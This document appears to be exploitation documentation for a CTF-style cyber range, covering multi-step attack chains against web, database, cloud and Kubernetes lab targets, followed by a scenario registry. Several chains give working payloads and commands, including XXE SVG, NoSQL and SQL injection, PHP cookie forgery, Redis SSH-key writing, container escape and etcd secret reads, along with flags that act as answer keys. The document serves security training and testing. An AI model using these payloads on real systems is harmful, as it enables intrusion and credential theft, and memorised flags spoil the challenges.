| 2→3 | COPY FROM PROGRAM → IMDS | PassRole → Lambda |
| 3→4 | PassRole → Lambda | Lambda FLAG2 |
| 4→5 | Lambda FLAG2 | 跨账号 → 最终 |



#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | SQLi → secrets 泄露 | 使用 COPY FROM PROGRAM 逃逸 |
| 2→3 | COPY FROM PROGRAM → IMDS 凭据 | 凭据有 iam:PassRole 权限 |
| 3→4 | PassRole → Lambda 特权执行 | Lambda 返回高权限凭据 |
| 4→5 | Lambda FLAG2 泄露 | 使用凭据跨账号访问 |


### Step-by-Step Exploitation
##### Step 1: SQLi → secrets
**Flag:** `flag{cdb-step1-...}`

##### Step 2: COPY FROM PROGRAM → IMDS
**Flag:** `flag{cdb-step2-...}`

##### Step 3: PassRole → Lambda
**Flag:** `flag{cdb-step3-...}`

##### Step 4: Lambda FLAG2
**Flag:** `flag{cdb-step4-...}`

##### Step 5: 跨账号 → 最终
**Flag:** `flag{cdb-step5-...}`



### Flags Summary
| Step 1 | `flag{cdb-to-passrole-step1-...}` |
| Step 2 | `flag{cdb-to-passrole-step2-...}` |
| Step 3 | `flag{cdb-to-passrole-step3-...}` |
| Step 4 | `flag{cdb-to-passrole-step4-...}` |
| Step 5 | `flag{cdb-to-passrole-step5-...}` |

---

<a id="chain-cf-to-scp"></a>

<!-- source: cve_challenges/docs/chains/cf-to-scp-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/cf-to-scp/chain.yaml -->

## CF Injection to S3 to Logging Gap to SCP Bypass

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-cf |
| Steps | 4 |
| Domains | Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | CF Fn::Sub → SSM | S3 桶名预测 → 影子资源 |
| 2→3 | S3 桶名预测 → 影子资源 | Logging Gap → 静默 |
| 3→4 | Logging Gap → 静默 | SCP Bypass → 最终 |



#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | CF Fn::Sub → SSM 参数泄露 | 泄露参数包含 S3 桶名预测公式 |
| 2→3 | S3 桶名预测 → 读取影子资源 | S3 配置显示审计日志盲区 |
| 3→4 | Logging Gap → 静默枚举 | 枚举发现可绕过 SCP 的旧版 API |


### Step-by-Step Exploitation
##### Step 1: CF Fn::Sub → SSM
**Flag:** `flag{ccf-step1-...}`

##### Step 2: S3 桶名预测 → 影子资源
**Flag:** `flag{ccf-step2-...}`

##### Step 3: Logging Gap → 静默
**Flag:** `flag{ccf-step3-...}`

##### Step 4: SCP Bypass → 最终
**Flag:** `flag{ccf-step4-...}`



### Flags Summary
| Step 1 | `flag{ccf-to-scp-step1-...}` |
| Step 2 | `flag{ccf-to-scp-step2-...}` |
| Step 3 | `flag{ccf-to-scp-step3-...}` |
| Step 4 | `flag{ccf-to-scp-step4-...}` |

---

<a id="chain-loggap-to-s3-stealth"></a>

<!-- source: cve_challenges/docs/chains/loggap-to-s3-stealth-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/loggap-to-s3-stealth/chain.yaml -->

## Logging Gap to SCP Bypass to S3 Stealth Exfiltration

### Overview
| Property | Value |
|----------|-------|
| Steps | 3 |
| Domains | Web + Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Logging Gap → 静默枚举 (无审计) | SCP Bypass → 策略绕过 |
| 2→3 | SCP Bypass → 策略绕过 | S3 桶垄断 → 最终 flag (无痕) |


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Logging Gap → 静默枚举云资源 (无审计痕迹) | 枚举发现可绕过 SCP 的旧版 API 端点 |
| 2→3 | SCP Bypass → 绕过服务控制策略限制 | 获得权限后可访问 S3 全局命名空间 |


### Step-by-Step Exploitation
##### Step 1: Logging Gap → 静默枚举 (无审计)
**Flag:** `flag{cloggap-to-s3-stealth-step1-...}`

##### Step 2: SCP Bypass → 策略绕过
**Flag:** `flag{cloggap-to-s3-stealth-step2-...}`

##### Step 3: S3 桶垄断 → 最终 flag (无痕)
**Flag:** `flag{cloggap-to-s3-stealth-step3-...}`


### Flags Summary
| Step 1 | `flag{cloggap-to-s3-stealth-step1-...}` |
| Step 2 | `flag{cloggap-to-s3-stealth-step2-...}` |
| Step 3 | `flag{cloggap-to-s3-stealth-step3-...}` |

---

<a id="chain-svctag-to-imds-to-deputy"></a>

<!-- source: cve_challenges/docs/chains/svctag-to-imds-to-deputy-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/svctag-to-imds-to-deputy/chain.yaml -->

## Service Tag Spoofing to IMDS to Confused Deputy

### Overview
| Property | Value |
|----------|-------|
| Steps | 4 |
| Domains | Web + Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Service Tag 伪造 → 防火墙绕过 | SSRF → IMDS → 托管凭据 |
| 2→3 | SSRF → IMDS → 托管凭据 | Confused Deputy → 代理滥用 |
| 3→4 | Confused Deputy → 代理滥用 | Deputy 凭据 → 最终 flag |


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Service Tag 伪造 → 绕过云防火墙 → 进入内部网络 | 内部网络可访问 IMDS 端点 |
| 2→3 | 内部网络 SSRF → IMDS → 窃取托管服务凭据 | 凭据为 managed identity → 可调用内部服务代理 |
| 3→4 | Confused Deputy → 代理滥用 → 跨服务访问 | svc-b 返回了受保护的管理员数据 |


### Step-by-Step Exploitation
##### Step 1: Service Tag 伪造 → 防火墙绕过
**Flag:** `flag{csvctag-to-imds-to-deputy-step1-...}`

##### Step 2: SSRF → IMDS → 托管凭据
**Flag:** `flag{csvctag-to-imds-to-deputy-step2-...}`

##### Step 3: Confused Deputy → 代理滥用
**Flag:** `flag{csvctag-to-imds-to-deputy-step3-...}`

##### Step 4: Deputy 凭据 → 最终 flag
**Flag:** `flag{csvctag-to-imds-to-deputy-step4-...}`


### Flags Summary
| Step 1 | `flag{csvctag-to-imds-to-deputy-step1-...}` |
| Step 2 | `flag{csvctag-to-imds-to-deputy-step2-...}` |
| Step 3 | `flag{csvctag-to-imds-to-deputy-step3-...}` |
| Step 4 | `flag{csvctag-to-imds-to-deputy-step4-...}` |

---

<a id="chain-web-to-db-to-cross-account"></a>

<!-- source: cve_challenges/docs/chains/web-to-db-to-cross-account-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/web-to-db-to-cross-account/chain.yaml -->

## Web RCE to DB Escape to IMDS to Cross-Account

### Overview
| Property | Value |
|----------|-------|
| Steps | 5 |
| Domains | Web + Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | WordPress RCE → Web Shell | PostgreSQL 弱口令 → DB 访问 |
| 2→3 | PostgreSQL 弱口令 → DB 访问 | COPY FROM PROGRAM → OS 逃逸 |
| 3→4 | COPY FROM PROGRAM → OS 逃逸 | SSRF → IMDS → IAM 凭据 |
| 4→5 | SSRF → IMDS → IAM 凭据 | 跨账号 AssumeRole → 最终 flag |


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | WordPress 文件上传 RCE → 获取 Web Shell | Web Shell 中发现数据库连接配置 |
| 2→3 | PostgreSQL 弱口令 → 数据库访问 | 数据库有 COPY FROM PROGRAM 权限 → 可执行 OS 命令 |
| 3→4 | COPY FROM PROGRAM → OS 逃逸 → 访问云基础设施 | 从 DB 容器可访问 IMDS 端点 |
| 4→5 | SSRF → IMDS → 窃取 IAM 临时凭据 | 凭据可调用 STS AssumeRole 跨账号 |


### Step-by-Step Exploitation
##### Step 1: WordPress RCE → Web Shell
**Flag:** `flag{cweb-to-db-to-cross-account-step1-...}`

##### Step 2: PostgreSQL 弱口令 → DB 访问
**Flag:** `flag{cweb-to-db-to-cross-account-step2-...}`

##### Step 3: COPY FROM PROGRAM → OS 逃逸
**Flag:** `flag{cweb-to-db-to-cross-account-step3-...}`

##### Step 4: SSRF → IMDS → IAM 凭据
**Flag:** `flag{cweb-to-db-to-cross-account-step4-...}`

##### Step 5: 跨账号 AssumeRole → 最终 flag
**Flag:** `flag{cweb-to-db-to-cross-account-step5-...}`


### Flags Summary
| Step 1 | `flag{cweb-to-db-to-cross-account-step1-...}` |
| Step 2 | `flag{cweb-to-db-to-cross-account-step2-...}` |
| Step 3 | `flag{cweb-to-db-to-cross-account-step3-...}` |
| Step 4 | `flag{cweb-to-db-to-cross-account-step4-...}` |
| Step 5 | `flag{cweb-to-db-to-cross-account-step5-...}` |

---

<a id="chain-xxe-to-es"></a>

<!-- source: cve_challenges/docs/chains/xxe-to-es-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/xxe-to-es/chain.yaml -->

## Chain-34: XXE SVG to Elasticsearch Data Exfiltration

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-34 |
| Steps | 2 (Web → DB) |
| Domains | Web, DB |
| Difficulty | L2 |

### Attack Path Summary
```
WEB-14 (XXE SVG Upload) → 读取服务器内部配置文件，发现 Elasticsearch 端点
  → DB-07 (Elasticsearch Script) → Painless 脚本查询隐藏索引获取 flag
```

### Chain Logic

**攻击故事：** 攻击者利用 Web 应用的 SVG 上传功能，通过 XXE 读取服务器上的内部配置文件，从中发现 Elasticsearch 服务的连接信息。随后在 Elasticsearch 中使用 Painless 脚本注入查询隐藏索引，提取敏感数据。

#### Pivot Points

| 步骤 | 输出/发现 | 如何作用于下一步 |
|:---:|------|------|
| 1→2 | XXE 读取 `/etc/hosts` 或应用 config，发现 `elasticsearch:9200` 在 localhost:10207 | 使用此地址直接访问 DB-07 的 Elasticsearch，该实例禁用了认证且允许 inline script |


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | XXE SVG Upload — Read internal files via malicious SVG, discover Elasticsearch endpoint | The SVG parsing error reveals Elasticsearch is running at localhost:10207 with inline scripts enabled |


### Prerequisites

#### Knowledge
- XXE (XML External Entity): 通过 SVG 文件的 DTD 声明读取服务器文件
- Elasticsearch Painless 脚本: 使用 inline script 查询任意索引
- Elasticsearch REST API: 索引枚举和文档检索

#### Tools
- curl: HTTP 请求 (SVG 上传 + ES API 调用)

### Step-by-Step Exploitation

#### Step 1: XXE SVG Upload (WEB-14)
**Flag:** `flag{c34-step1-xxe}`
```
## 构造包含 XXE 的 SVG 文件
cat > xxe.svg << 'SVG'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
SVG
curl -X POST http://localhost:10114/upload -F "file=@xxe.svg"
## 发现 elasticsearch:9200，实际端口为 10207
```
**→ Next:** 从配置中发现 ES 端点，ES 实例配置了 `script.allowed_types=inline`。

#### Step 2: Elasticsearch Script Injection (DB-07)
**Flag:** `flag{c34-step2-es}`
```
## 枚举索引
curl http://localhost:10207/_cat/indices
## 发现 hidden_config 索引
## 使用 Painless 脚本查询
curl -X POST http://localhost:10207/hidden_config/_search -H 'Content-Type: application/json' \
  -d '{"query":{"script_score":{"query":{"match_all":{}},"script":{"source":"doc[\"flag\"].value"}}}}'
```

### Flag Location
- Step 1: WEB-14 容器的 `/flag.txt`（通过 XXE 读取）
- Step 2: DB-07 Elasticsearch 的 `hidden_config` 索引 flag 字段

### Verification Commands
```bash
cd chains/xxe-to-es && bash deploy.sh
curl http://localhost:10114/
curl http://localhost:10207/_cat/indices
```

---

<a id="chain-php-to-mongo"></a>

<!-- source: cve_challenges/docs/chains/php-to-mongo-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/php-to-mongo/chain.yaml -->

## Chain-35: PHP Deserialization to MongoDB NoSQL Injection

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-35 |
| Steps | 2 (Web → DB) |
| Domains | Web, DB |
| Difficulty | L2 |

### Attack Path Summary
```
WEB-17 (PHP 反序列化) → 绕过认证获得 admin 面板 → 发现 MongoDB API 连接
  → DB-09 (MongoDB NoSQLi) → $ne 操作符绕过 MongoDB 登录 → 提取 admin 用户 flag
```

### Chain Logic

**攻击故事：** 攻击者利用 PHP 对象的反序列化漏洞绕过 Web 认证，进入 admin 面板后发现内网 MongoDB API 的连接信息。随后使用 NoSQL 注入（`$ne` 操作符）绕过 MongoDB 的认证查询，提取管理员的 flag 字段。

#### Pivot Points

| 步骤 | 输出/发现 | 如何作用于下一步 |
|:---:|------|------|
| 1→2 | 反序列化获得 admin session，dashboard 中显示 `MongoDB API: localhost:10209` | 该 MongoDB API 的登录端点存在 NoSQL 注入，可通过 `$ne` 操作符绕过密码验证 |


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | PHP Deserialization Auth Bypass — Craft serialized PHP object to gain admin, discover internal MongoDB API endpoint | The admin dashboard reveals an internal MongoDB API at localhost:10209. Try NoSQL injection to bypass authentication. |


### Prerequisites

#### Knowledge
- PHP 对象反序列化: 构造恶意序列化对象修改 `is_admin` 属性
- MongoDB NoSQL 注入: 使用 `$ne`、`$regex` 等操作符绕过认证查询

#### Tools
- curl: HTTP POST / JSON 请求
- Python3: 生成序列化 PHP 对象

### Step-by-Step Exploitation

#### Step 1: PHP Deserialization Auth Bypass (WEB-17)
**Flag:** `flag{c35-step1-php}`
```
## 构造序列化 PHP 对象: User 类，is_admin=true
python3 -c "import base64; print(base64.b64encode(b'O:4:\"User\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"is_admin\";b:1;}').decode())"
## 将 base64 字符串设置为 cookie: user=<payload>
curl -b "user=<payload>" http://localhost:10117/admin
```
**→ Next:** Admin dashboard 显示 MongoDB API 连接指向 localhost:10209。

#### Step 2: MongoDB NoSQL Injection (DB-09)
**Flag:** `flag{c35-step2-mongo}`
```
curl -X POST http://localhost:10209/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":""}}'
## 响应中包含 admin 用户的 flag 字段
```

### Flag Location
- Step 1: WEB-17 的 admin panel 页面中的 flag note
- Step 2: DB-09 MongoDB `users` collection 中 admin 文档的 flag 字段

### Verification Commands
```bash
cd chains/php-to-mongo && bash deploy.sh
curl http://localhost:10117/
curl http://localhost:10209/
```

---

<a id="chain-redis-to-k8s"></a>

<!-- source: cve_challenges/docs/chains/redis-to-k8s-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/redis-to-k8s/chain.yaml -->

## Chain: Redis to K8s Cluster Admin (redis-to-k8s)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-16 |
| Steps | 4 (DB → K8s) |
| Domains | Database, Kubernetes |
| Difficulty | L3 |

### Attack Path Summary

```
DB-05 (Redis Unauthorized) → 未授权 Redis → 写 SSH key → 初始 shell
  → K8S-11 (Privileged Container) → nsenter 进入宿主机 → 读宿主机 flag
  → K8S-06 (RBAC Abuse) → SA token → 读 secrets
  → K8S-08 (etcd Unauthorized) → etcdctl → 完整集群控制 → FINAL
```



### Step-by-Step Exploitation

#### Step 1: Redis Unauthorized Access (DB-05)
**Flag:** `flag{chain16-step1-redis}`

```bash
redis-cli -h localhost -p 10205 PING
## CONFIG SET dir /home/victim/.ssh
## CONFIG SET dbfilename authorized_keys
## SET key "$(cat ~/.ssh/id_rsa.pub)"
## SAVE
ssh -i ~/.ssh/id_rsa -p 10222 victim@localhost
cat /flag.txt
```

#### Step 2: Privileged Container Breakout (K8S-11)
**Flag:** `flag{chain16-step2-priv}`

```bash
kubectl exec chain16-step2 -- nsenter --target 1 --mount cat /host-flag/flag.txt
```

#### Step 3: RBAC Secrets Abuse (K8S-06)
**Flag:** `flag{chain16-step3-rbac}`

```bash
kubectl get secret chain16-step3 -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

#### Step 4: etcd Unauthorized Access (K8S-08)
**Flag:** `flag{chain16-step4-etcd-final}`

```bash
etcdctl --endpoints=https://localhost:11379 --insecure-skip-tls-verify \
  get /registry/secrets/kube-system/chain16-step4 | grep -o 'flag{[^}]*}'
```

---

<a id="chain-wp-lfi-to-cluster"></a>

<!-- source: cve_challenges/docs/chains/wp-lfi-to-cluster-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/wp-lfi-to-cluster/chain.yaml -->

## Chain: WordPress LFI to Cluster Admin (wp-lfi-to-cluster)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-17 |
| Steps | 4 (Web → K8s) |
| Domains | Web, Kubernetes |
| Difficulty | L3 |

### Attack Path Summary

```
WEB-06 (WordPress LFI) → Contributor 登录 → SVG 上传 → PHP LFI → RCE
  → K8S-06 (RBAC Abuse) → SA token → 读 secrets
  → K8S-01 (runC Escape) → 容器逃逸到宿主机
  → K8S-08 (etcd Unauthorized) → 直接读 etcd → FINAL
```



### Step-by-Step Exploitation

#### Step 1: WordPress Jupiter X LFI to RCE (WEB-06)
**Flag:** `flag{chain17-step1-lfi}`

```bash
## 以 contributor 登录
curl -c cookies.txt -X POST http://localhost:10106/wp-login.php \
  -d "log=contributor&pwd=Password123!"

## 上传恶意 SVG (含 PHP 代码)
curl -b cookies.txt http://localhost:10106/wp-admin/admin-ajax.php \
  -F "action=jupiterx_upload" -F "file=@payload.svg"

## LFI 触发 PHP 代码执行
curl "http://localhost:10106/?file=../../../../wp-content/uploads/jupiterx/payload.svg&c=cat+/flag.txt"
```

#### Step 2: RBAC Secrets Abuse (K8S-06)
**Flag:** `flag{chain17-step2-rbac}`

```bash
kubectl get secret chain17-step2 -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

#### Step 3: runC Container Escape (K8S-01)
**Flag:** `flag{chain17-step3-runc}`

```bash
kubectl exec chain17-final -- cat /host-flag/flag.txt
```

#### Step 4: etcd Unauthorized Access (K8S-08)
**Flag:** `flag{chain17-step4-etcd-final}`

```bash
etcdctl --endpoints=https://localhost:11379 --insecure-skip-tls-verify \
  get /registry/secrets/kube-system/chain17-step4 | grep -o 'flag{[^}]*}'
```

---

<a id="chain-pg-sqli-to-node"></a>

<!-- source: cve_challenges/docs/chains/pg-sqli-to-node-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/pg-sqli-to-node/chain.yaml -->

## Chain: PostgreSQL SQLi to Node Compromise (pg-sqli-to-node)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-15 |
| Steps | 4 (Web → DB → K8s) |
| Domains | Web, Database, Kubernetes |
| Difficulty | L3 |

### Attack Path Summary

```
WEB-07 (PG SQLi) → BIG5 编码绕过 → SQL 注入 → 数据库读取
  → DB-01 (PG Weak Auth RCE) → COPY PROGRAM → 系统命令执行
  → K8S-12 (hostPath Escape) → 符号链接攻击 → 宿主机文件访问
  → K8S-07 (Kubelet Anonymous) → Kubelet API → 读 secrets → FINAL
```



### Step-by-Step Exploitation

#### Step 1: PostgreSQL Encoding Bypass SQLi (WEB-07)
**Flag:** `flag{chain15-step1-sqli}`

```bash
curl "http://localhost:10107/search?q=%a5%27+UNION+SELECT+flag,1+FROM+flag_holder--"
```

#### Step 2: PostgreSQL Weak Auth RCE (DB-01)
**Flag:** `flag{chain15-step2-db-rce}`

```bash
psql -h localhost -p 10201 -U postgres -d postgres
## Password: password123
COPY (SELECT '') TO PROGRAM 'cat /flag.txt';
```

#### Step 3: hostPath Symlink Escape (K8S-12)
**Flag:** `flag{chain15-step3-hostpath}`

```bash
kubectl exec chain15-hostpath -- sh
ln -s /host-flag/flag.txt /var/log/flag_link
cat /var/log/flag_link
```

#### Step 4: Kubelet Anonymous Access (K8S-07)
**Flag:** `flag{chain15-step4-kubelet-final}`

```bash
curl -k https://NODE_IP:10250/runningpods/
kubectl get secret chain15-step4-final -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

---

## 附录 A：可部署场景注册表

来源：`cve_challenges/scripts/scenarios.yaml`。

| Key | ID | 名称 | 类型 | 难度 | CVE/技术 | 端口 | 路径 |
|-----|-----|------|------|------|----------|------|------|
| cloud-01 | CLOUD-01 | SSRF to IMDS Credential Theft | docker | L2 | N/A (SSRF → IMDS) | 10601 | `docker/cloud/ssrf-to-imds` |
| cloud-02 | CLOUD-02 | Container Escape via CAP_NET_RAW → Metadata MITM | k8s | L3 | N/A (CAP_NET_RAW + ARP spoofing) | — | `docker/cloud/cap-netraw-metadata` |
| cloud-03 | CLOUD-03 | K8s SA Token → Cross-Namespace Access | k8s | L3 | N/A (overly permissive RBAC) | — | `docker/cloud/sa-cross-namespace` |
| cloud-04 | CLOUD-04 | Lambda Code Injection → IAM PassRole | docker | L2 | N/A (command injection + IAM privesc) | 10604 | `docker/cloud/lambda-passrole` |
| cloud-05 | CLOUD-05 | CloudFormation Template Injection → SSM | docker | L2 | N/A (CF Fn::Sub injection) | 10605 | `docker/cloud/cf-injection` |
| cloud-06 | CLOUD-06 | Managed DB COPY FROM PROGRAM → IMDS Access | docker | L2 | N/A (SQLi + COPY FROM PROGRAM) | 10606 | `docker/cloud/db-to-imds` |
| cloud-07 | CLOUD-07 | S3 Bucket Monopoly → Shadow Resource | docker | L2 | N/A (global namespace squatting) | 10607 | `docker/cloud/s3-monopoly` |
| cloud-08 | CLOUD-08 | CI/CD Pipeline Poisoning → Secret Exfiltration | docker | L2 | N/A (CI/CD script injection) | 10608 | `docker/cloud/ci-poisoning` |
| cloud-09 | CLOUD-09 | AI Notebook Escape → K8s SA Token Theft | docker | L3 | N/A (notebook escape + SA token) | 10609 | `docker/cloud/notebook-escape` |
| cloud-10 | CLOUD-10 | API Gateway Header Smuggling → Admin Access | docker | L2 | N/A (X-Forwarded-For smuggling) | 10610 | `docker/cloud/gateway-smuggling` |
| cloud-11 | CLOUD-11 | OIDC Claim Mismatch → Cross-Repo AssumeRole | docker | L2 | N/A (OIDC federation misconfiguration) | 10611 | `docker/cloud/oidc-federation` |
| cloud-12 | CLOUD-12 | IAM Trust Policy Principal:* → Cross-Account Takeover | docker | L2 | N/A (overly permissive trust policy) | 10612 | `docker/cloud/cross-account-trust` |
| cloud-13 | CLOUD-13 | Golden SAML → Federation Trust Root Compromise | docker | L3 | N/A (SAML signing key exposure) | 10613 | `docker/cloud/golden-saml` |
| cloud-14 | CLOUD-14 | PassRole Abuse → Cross-Service Lambda Execution | docker | L2 | N/A (iam:PassRole + lambda:CreateFunction) | 10614 | `docker/cloud/passrole-abuse` |
| cloud-15 | CLOUD-15 | SCP Bypass via Legacy API Version | docker | L2 | N/A (SCP enforcement gap) | 10615 | `docker/cloud/scp-bypass` |
| cloud-16 | CLOUD-16 | CloudTrail Logging Gap → Silent Enumeration | docker | L2 | N/A (unrecorded API endpoint) | 10616 | `docker/cloud/logging-gap` |
| cloud-17 | CLOUD-17 | Managed Identity Confused Deputy → Cross-Service Access | docker | L2 | N/A (confused deputy abuse) | 10617 | `docker/cloud/confused-deputy` |
| cloud-18 | CLOUD-18 | Service Tag Spoofing → Firewall Bypass | docker | L2 | N/A (service tag header spoofing) | 10618 | `docker/cloud/svc-tag-spoof` |
| cloud-19 | CLOUD-19 | Multi-Tenant K8s: Container Escape → Cross-Tenant Access | k8s | L3 | N/A (privileged container + hostPID escape) | — | `docker/cloud/multi-tenant-k8s` |
| cloud-20 | CLOUD-20 | Shared Metadata Proxy → Cross-Tenant Credential Leak | docker | L3 | N/A (shared proxy tenant isolation failure) | 10620 | `docker/cloud/shared-metadata-proxy` |
| cloud-21 | CLOUD-21 | Global S3 Namespace Squatting → Cross-Tenant Data Theft | docker | L3 | N/A (global namespace resource squatting) | 10621 | `docker/cloud/global-s3-squatting` |
| cloud-22 | CLOUD-22 | Shared AI Inference Queue → Cross-Tenant Data Leak | docker | L3 | N/A (multi-tenant queue isolation failure) | 10622 | `docker/cloud/shared-inference-queue` |
| db-01 | DB-01 | PostgreSQL Weak Auth RCE | docker | L2 | N/A (misconfiguration) | 10201 | `docker/db/postgres-weak-auth` |
| db-02 | DB-02 | MySQL Weak Auth UDF | docker | L2 | MySQL UDF Abuse | 10202 | `docker/db/mysql-udf-direct` |
| db-03 | DB-03 | Oracle TNS Poisoning | docker | L3 | TNS Poisoning | 10203 | `docker/db/oracle-tns` |
| db-04 | DB-04 | MSSQL Linked Server Lateral Movement | docker | L3 | MSSQL Linked Server | 10204 | `docker/db/mssql-linked-server` |
| db-05 | DB-05 | Redis Unauthorized Access | docker | L1 | N/A (misconfiguration) | 10205 | `docker/db/redis-unauth` |
| db-06 | DB-06 | MongoDB Unauthorized Access | docker | L1 | N/A (misconfiguration) | 10206 | `docker/db/mongodb-unauth` |
| db-07 | DB-07 | Elasticsearch Script Injection | docker | L2 | N/A (script injection) | 10207 | `docker/db/elasticsearch-script` |
| db-08 | DB-08 | CouchDB Arbitrary Command Execution | docker | L2 | N/A (Erlang native view RCE) | 10208 | `docker/db/couchdb-rce` |
| db-09 | DB-09 | MongoDB NoSQL Injection | docker | L2 | N/A (NoSQL injection) | 10209 | `docker/db/mongodb-nosqli` |
| k8s-01 | K8S-01 | runC WORKDIR Container Escape | k8s | L2 | CVE-2024-21626 | — | `k8s/runc-cve-2024-21626` |
| k8s-02 | K8S-02 | runC /dev/null Symlink Escape | k8s | L2 | CVE-2025-31133 | — | `k8s/runc-cve-2025-31133` |
| k8s-03 | K8S-03 | runC LSM Bypass Escape | k8s | L3 | CVE-2025-52881 | — | `k8s/runc-cve-2025-52881` |
| k8s-05 | K8S-05 | K8s gitRepo Volume Escape | k8s | L2 | CVE-2024-10220 | — | `k8s/gitrepo-cve-2024-10220` |
| k8s-06 | K8S-06 | K8s RBAC Secrets Abuse | k8s | L1 | N/A (misconfiguration) | — | `k8s/rbac-secrets` |
| k8s-07 | K8S-07 | Kubelet API Anonymous Access | k8s | L2 | N/A (misconfiguration) | — | `k8s/kubelet-unauth` |
| k8s-08 | K8S-08 | etcd Unauthorized Access | k8s | L3 | N/A (misconfiguration) | — | `k8s/etcd-unauth` |
| k8s-09 | K8S-09 | Private Registry Poisoning | k8s | L2 | N/A (misconfiguration) | — | `k8s/registry-poison` |
| k8s-10 | K8S-10 | Helm v2 Tiller Unauthenticated | k8s | L1 | N/A (misconfiguration) | — | `k8s/helm-tiller` |
| k8s-11 | K8S-11 | Privileged Container Breakout | k8s | L2 | N/A (privileged pod) | — | `k8s/privileged-breakout` |
| k8s-12 | K8S-12 | hostPath Writable Mount Escape | k8s | L2 | N/A (hostPath mount) | — | `k8s/hostpath-escape` |
| k8s-13 | K8S-13 | SA Token Cross-Namespace Lateral | k8s | L2 | N/A (RBAC lateral) | — | `k8s/sa-cross-ns` |
| k8s-14 | K8S-14 | CAP_SYS_ADMIN cgroup Escape | k8s | L3 | CAP_SYS_ADMIN abuse | — | `k8s/cap-sys-admin-cgroup` |
| k8s-15 | K8S-15 | Mutable Image Tag Supply Chain | k8s | L2 | N/A (image tag mutation) | — | `k8s/mutable-image-tag` |
| k8s-16 | K8S-16 | CRI Socket Mount Escape | k8s | L2 | CRI socket abuse | — | `k8s/cri-socket-escape` |
| k8s-17 | K8S-17 | Docker Socket Mount Escape | k8s | L1 | Docker socket abuse | — | `k8s/docker-socket-escape` |
| k8s-18 | K8S-18 | SA Token Cluster-Admin Escalation | k8s | L2 | RBAC misconfiguration | — | `k8s/sa-cluster-admin` |
| k8s-19 | K8S-19 | CAP_SYS_PTRACE Host Process Injection | k8s | L3 | CAP_SYS_PTRACE abuse | — | `k8s/cap-sys-ptrace-inject` |
| k8s-20 | K8S-20 | ingress-nginx Admission Controller RCE (IngressNightmare) | k8s | L3 | CVE-2025-1974 | 10443 | `k8s/ingress-nginx-rce` |
| k8s-21 | K8S-21 | ingress-nginx Lua Snippet Secret Extraction | k8s | L2 | CVE-2021-25742 | 10480 | `k8s/ingress-snippet` |
| k8s-22 | K8S-22 | Service ExternalIP Traffic Interception | k8s | L2 | CVE-2020-8554 | — | `k8s/externalip-hijack` |
| k8s-23 | K8S-23 | hostPID ProcFS Host Filesystem Access | k8s | L1 | N/A (misconfiguration) | — | `k8s/seccomp-bypass` |
| k8s-24 | K8S-24 | kube-proxy Localhost Boundary Bypass | k8s | L2 | CVE-2020-8558 | — | `k8s/localhost-bypass` |
| k8s-25 | K8S-25 | Mutating Webhook Sidecar Injection | k8s | L2 | N/A (admission control abuse) | — | `k8s/webhook-inject` |
| k8s-26 | K8S-26 | Compromised Node API Server Redirect | k8s | L3 | CVE-2020-8559 | — | `k8s/node-redirect` |
| k8s-27 | K8S-27 | NetworkPolicy Label Spoofing Bypass | k8s | L2 | N/A (network policy bypass) | — | `k8s/networkpolicy-bypass` |
| k8s-28 | K8S-28 | Node Selector Evasion | k8s | L2 | N/A (scheduling bypass) | — | `k8s/node-selector-evasion` |
| k8s-29 | K8S-29 | Toleration Abuse (Taint Bypass) | k8s | L2 | N/A (taint bypass) | — | `k8s/toleration-abuse` |
| k8s-30 | K8S-30 | CNI IP Spoofing (NetworkPolicy Bypass) | k8s | L2 | N/A (IP spoofing) | — | `k8s/cni-ip-spoof` |
| web-01 | WEB-01 | Apache Tomcat Deserialization RCE | docker | L2 | CVE-2025-24813 | 10101 | `docker/web/tomcat-deserialization` |
| web-02 | WEB-02 | Apache Tomcat Race Condition RCE | docker | L2 | CVE-2024-50379 | 10102 | `docker/web/tomcat-race-condition` |
